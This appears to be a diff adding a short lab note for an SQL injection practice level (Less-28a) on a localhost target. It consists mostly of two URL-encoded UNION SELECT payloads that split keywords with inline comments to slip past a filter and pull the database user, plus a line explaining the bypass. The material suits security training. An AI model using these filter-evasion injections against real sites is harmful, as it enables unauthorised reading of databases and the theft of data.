@@ -1,0 +1,10 @@
+http://127.0.0.1/sql/Less-28a/?id=25%27)%20union/*%0A*/%20select/*%0A*/1,user(),1/*%0A*/%20or%20(%271%27)=(%271
+
+union and select when nearby getting sanatized
+
+hence separated by /**/
+
+Hence this will also work
+
+>>> http://127.0.0.1/sql/Less-28a/?id=25%27)%20union/**/select/**/1,user(),1/**/%20or%20(%271%27)=(%271
+
